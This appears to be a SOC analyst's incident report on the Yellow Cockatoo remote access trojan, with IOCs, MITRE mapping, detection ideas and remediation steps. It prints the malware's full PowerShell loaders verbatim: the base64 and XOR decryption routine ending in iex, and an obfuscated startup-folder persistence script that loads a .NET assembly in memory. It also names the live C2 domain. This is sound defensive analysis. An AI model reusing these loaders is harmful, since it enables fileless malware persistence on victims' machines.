# Important note
**In a real SOC environment, Tier-1 triage would likely confirm malicious activity via reputation and EDR telemetry before escalation. The following analysis represents a deeper L2/L3 investigation conducted for learning and detection-engineering purposes.**
<hr> 

# Incident Summary
Abnormal network traffic was detected from multiple workstations. After further investigation, multiple indicators and behavioral patterns consistent with Yellow Cockatoo activity were observed.and with forensic analysis, the C2 domain and some filenames have been documented to prevent further communication with the C2 server and to raise the security robustness of our system 
# Business Impact 
Yellow Cockatoo is a Remote Access Trojan (RAT) that provides attackers with control over infected machines. This access allows execution of arbitrary commands and monitoring of network activity, impacting data confidentiality and integrity through unauthorized access and potential data manipulation. The malware can spread laterally across the network, increasing the risk of additional workstation compromise.
#  Investigation Methodology
- Reviewed static analysis artifacts
- Researched in Threat intelligence for common patterns, i.e.(filenames, domains ,specific IP subnets)
- Confirmed the existence of a domain usually associated with the Yellow Cockatoo.
# IOCs 
| Type | Value | Description |
| :--- | :--- | :--- |
| **Domain** | `gogohid.com` | C2 Server Domain |
| **IP Subnet** | `45.146.165[.]X` | IP subnet of the C2 server|
| **filename** | `solarmarker.dat` | .dat file associated with YellowRAT|
| **Observed Key** | KjycAqXpZMgQmwrRYFkDJTfiHdIStWVuELNxvzBOChPUenoGbal | This key is XORed with the decoded version of the .txt file |
# Analysis & MITRE ATT&CK Mapping
## Analysis
### Initial Access

it begins with a web search query, if you made a query for soc analysts, you are redirected to a web page, and soc-analysts.exe is downloaded to your workstation.

### Execution

.exe → .tmp →powershellScript→.dll(.net assembly)

The PowerShell script is as follows 

`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command "$p='C:\Users\REDACTED\e091d09fa72e9b46db8a0a512eec30c9.txt';$xk='KjycAqXpZMgQmwrRYFkDJTfiHdIStWVuELNxvzBOChPUenoGbals';$xb=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p));remove-item $p;for($i=0;$i -lt $xb.count;){for($j=0;$j -lt $xk.length;$j++){$xb[$i]=$xb[$i] -bxor $xk[$j];$i++;if($i -ge $xb.count){$j=$xk.length}}};$xb=[System.Text.Encoding]::UTF8.GetString($xb);iex $xb;"`

this script basically consisted of 5 sections 

1- Locate the .txt file 

2- define the encryption key, which in this case is `KjycAqXpZMgQmwrRYFkDJTfiHdIStWVuELNxvzBOChPUenoGbal`

3- 

  - Load the decoded payload into memory

  - Decode it using base64 

  - Store it in the memory 

  - Delete the .exe file to ensure no traces are left behind and by that the only version resides in the memory

4- Decrypt using XOR 

5-uses `iex` to execute the decrypted script 

<aside>
🔒

A couple of Important notes here if you want to make a detection rule out of it: 

1- Most likely, an encoded PowerShell script is malicious; however, we cannot make a statement out of it because it would generate great numbers of false positives, so it’s most likely correlated with XOR obfuscation in the command line, so if we wanted to make a detection rule, we would look for FromBase64String and also -bxor 

2-this script contains the creation of .dat and .lnk files, which are used for persistence, and we’ll further discuss it

</aside>

The .dat and .lnk files launch cmd.exe, which launches another block of PowerShell code 
`powershell -w hidden -command "$abab188938847d9e028b83169bd97=$env:appdata+'\microsoft\windows\start menu\programs\startup\[REDACTED].lnk';if(-not(test-path $abab188938847d9e028b83169bd97)){$a1fe836cd2f4a584c8b26df3c899e=new-object -comobject wscript.shell;$a887c3fc4114a6ae35adcfe97686a=$a1fe836cd2f4a584c8b26df3c899e.createshortcut($abab188938847d9e028b83169bd97);$a887c3fc4114a6ae35adcfe97686a.windowstyle=7;$a887c3fc4114a6ae35adcfe97686a.targetpath='c:\users\[REDACTED]\appdata\roaming\microsoft\dwau\[REDACTED].cmd';$a887c3fc4114a6ae35adcfe97686a.save();};if((get-process -name '*powershell*').count -lt 15){$a41841141c743b8d10df14c793537='XjFIS3leTXtiQ15QYVBvXlBZLT5AVDh9Zl5TcCRWXm9OTG9eUWdZNUB9O01mQHVRKXBAcnRhUztoZClObn4xcF5vRXAlQHdCXnxAdm9BKEB9UCFgXjBja0Feb15eWUBSWCo2QHZWV2VAcypCKkB1ailDQHV7aH1Ac1BaI0Byc2gxXk9KfDNeUGBUeF5ReEFkQFIqe1RAfVpHfF5vT15MPWJWdTdqR0xNOG1XSHxWem43LSlsWV5BPXVBe3Axem05P05zK1h8eHJvRXk=';$afc49a7db894a1989bc60a8b4dcd7=[system.io.file]::readallbytes([system.text.encoding]::utf8.getstring([system.convert]::frombase64string('QzpcVXNlcnNcS2VsbHlSZVxBcHBEYXRhXFJvYW1pbmdcTUlDUm9zT2ZUXERXYVVcQ2JXTXJFbkpab3ZLQkxSTk9teFN1R1hwVUFQcUhrY3R5VEZoalFWZXN6ZGFZbElmZ0R3aQ==')));for($a0bf2735f83489b6c01ebc52dd3ad=0;$a0bf2735f83489b6c01ebc52dd3ad -lt $afc49a7db894a1989bc60a8b4dcd7.count;){for($ad3c9c588084759dffa6395ab35e5=0;$ad3c9c588084759dffa6395ab35e5 -lt $a41841141c743b8d10df14c793537.length;$ad3c9c588084759dffa6395ab35e5++){$afc49a7db894a1989bc60a8b4dcd7[$a0bf2735f83489b6c01ebc52dd3ad]=$afc49a7db894a1989bc60a8b4dcd7[$a0bf2735f83489b6c01ebc52dd3ad] -bxor $a41841141c743b8d10df14c793537[$ad3c9c588084759dffa6395ab35e5];$a0bf2735f83489b6c01ebc52dd3ad++;if($a0bf2735f83489b6c01ebc52dd3ad -ge $afc49a7db894a1989bc60a8b4dcd7.count){$ad3c9c588084759dffa6395ab35e5=$a41841141c743b8d10df14c793537.length}}};[system.reflection.assembly]::load($afc49a7db894a1989bc60a8b4dcd7);[d.m]::run()}"`

This basically does a couple of things 

1. It finds the startup folder in Windows to establish the persistence phase, and no matter how many times the PC is shut down, the script will always boot on startup. if it can’t find it, it will create a new one using a com (Computer Object Model)-it allows different applications and parts of Windows to communicate, and works since Windows is a monolithic OS- object. Keep in mind the .windowstyle=7 is a stealth technique which tells Windows to execute in minimized window not pop up one.

2-`if((get-process -name '*powershell*').count -lt 15)`: this is a defense evasion procedure as it gets the number of PowerShell instances working currently, and if it’s more than 15, then the script will have another output thinking it’s working in a sandbox or something

3-`{$a41841141c743b8d10df14c793537='XjFIS3leTXtiQ15QYVBvXlBZLT5AVDh9Zl5TcCRWXm9OTG9eUWdZNUB9O01mQHVRKXBAcnRhUztoZClObn4xcF5vRXAlQHdCXnxAdm9BKEB9UCFgXjBja0Feb15eWUBSWCo2QHZWV2VAcypCKkB1ailDQHV7aH1Ac1BaI0Byc2gxXk9KfDNeUGBUeF5ReEFkQFIqe1RAfVpHfF5vT15MPWJWdTdqR0xNOG1XSHxWem43LSlsWV5BPXVBe3Axem05P05zK1h8eHJvRXk=';$afc49a7db894a1989bc60a8b4dcd7=[system.io.file]::readallbytes([system.text.encoding]::utf8.getstring([system.convert]::frombase64string('QzpcVXNlcnNcS2VsbHlSZVxBcHBEYXRhXFJvYW1pbmdcTUlDUm9zT2ZUXERXYVVcQ2JXTXJFbkpab3ZLQkxSTk9teFN1R1hwVUFQcUhrY3R5VEZoalFWZXN6ZGFZbElmZ0R3aQ==')));for($a0bf2735f83489b6c01ebc52dd3ad=0;$a0bf2735f83489b6c01ebc52dd3ad -lt $afc49a7db894a1989bc60a8b4dcd7.count;)`: decoding the string to find the data path 

4-`{for($ad3c9c588084759dffa6395ab35e5=0;$ad3c9c588084759dffa6395ab35e5 -lt $a41841141c743b8d10df14c793537.length;$ad3c9c588084759dffa6395ab35e5++){$afc49a7db894a1989bc60a8b4dcd7[$a0bf2735f83489b6c01ebc52dd3ad]=$afc49a7db894a1989bc60a8b4dcd7[$a0bf2735f83489b6c01ebc52dd3ad] -bxor $a41841141c743b8d10df14c793537[$ad3c9c588084759dffa6395ab35e5];$a0bf2735f83489b6c01ebc52dd3ad++;if($a0bf2735f83489b6c01ebc52dd3ad -ge $afc49a7db894a1989bc60a8b4dcd7.count){$ad3c9c588084759dffa6395ab35e5=$a41841141c743b8d10df14c793537.length}}};`:  2 for loops to decrypt the contents of the data file decoded in the previous step using XOR.

5- This is by far the most important part of the analysis 

`[system.reflection.assembly]::load($afc49a7db894a1989bc60a8b4dcd7);[d.m]::run()}"` 

Instead of writing the decrypted malware back to the hard disk, it writes it to memory as a .NET assembly and starts execution using a function called run() in the class d, which in turn starts the actual malware.

Another variant found in Morphisec is 

`[jupyTER.jupyTER]::RuN()`

### Persistence

It keeps its persistence by writing in the startup folder, so every time the user logs in, it does the execution phase over again, ensuring first that no traces are left behind in the hard disk, and second that the malware is executed again

### C2

After the run(); function in the execution phase is completed, the malware itself collects information about the host then loads a random string that serves as a unique identifier in `solarmaker.dat`, you can find it under the following path 

`%USERPROFILE%\AppData\Roaming\solarmarker.dat` 

Then it communicates with the following domain 

 `https://gogohid.com` 

with the IP subnet of 45.146.165[.]X

Initial communication includes the collected device information. 

After that, it waits for the commands to be parsed and executed in the infected machine. It's using beaconing to make sure it's always connected to the infected machine 

Upon executing a command, its execution status is reported to `https://gogohid[.]com/success?i=ENCODED_CMD_AND_HOST_ID_INFO`

It can use the following command:
• `rpe`: downloads an executable buffer in memory and injects and loads it into `c:\windows\system32\msinfo32.exe` using [**Process Hollowing**](https://attack.mitre.org/techniques/T1055/012/) (T1055.012) technique
## MITRE ATT&CK Mapping 
- Intial Access (TA0001) --> Drive-by Compromise(T1189)
- Execution --> User Execution (T1204.002)  , Command and Scripting Interpreter: PowerShell(T1059.001)
- Defense Evasion --> Obfuscated Files or Information: Fileless Storage(T1027.011)
- Persistence --> Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001)
- Command And Control --> Application Layer Protocol: Web Protocols (T1071.001)
- Exfiltration --> Exfiltration Over C2 Channel (T1041)
# Verdict
Verdict: Malicious \
Confidence: High \
This Activity demonstrates a sophisticated fileless Remote Access Trojan called (Yellow Cockatoo)
# Recommended Next Actions
**Escalate to L2**
Suggesting the following: 
1. Block the domain https://gogohid[.]com to cut the C2 communication
2. Isolate the infected machines for further deep forensic analysis
3. Clean up the startup file in Windows and clean the written registry keys
4. Add the artifacts to a detection rule
